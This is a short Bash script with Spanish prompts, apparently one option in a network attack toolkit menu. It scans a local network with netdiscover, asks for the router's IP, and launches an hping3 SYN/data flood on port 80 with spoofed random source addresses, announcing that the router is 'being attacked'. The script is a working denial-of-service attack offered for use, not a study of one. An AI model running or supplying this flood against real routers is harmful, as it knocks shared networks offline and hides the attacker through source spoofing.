#!bin/bash

source installer.sh

Title
echo "[5] Relentizar el flujo de datos del Router"
echo
read -p "[*] Escribe la Ip de Red (Ej: 192.168.1.0 o 192.168.0.0): " opc1
sudo netdiscover -r $opc1/24 -P
echo
read -p "[*] Pon la IP del Route (Ej: 192.168.1.1): " ip
Title
echo "[#] Pulse Ctrl + c (Finalizar Ataque)"
echo
echo "========================================================================================="
echo "                      El Router ($ip) esta siendo Atacado""                       |"
echo "========================================================================================="
echo
sudo gnome-terminal -- sudo ping $ip
sleep 2
sudo hping3 --rand-source -V -d 500 $ip -p 80 --flood
sleep 1
echo
echo
echo "#####################"
echo "[1] Volver al Menu"
echo "[2] Volver a ejecutar"
echo "[3] Salir"
echo "#####################"
echo
read -p "Elige una opcion: " opc2
	case $opc2 in
			1 )	bash inhibitor.sh
				;;
			2 )	bash requisitos/5.sh
				;;
			3 )	exit && clear
				;;
			* )	echo
				echo "$RRPLY No es una opcion valida"
	esac
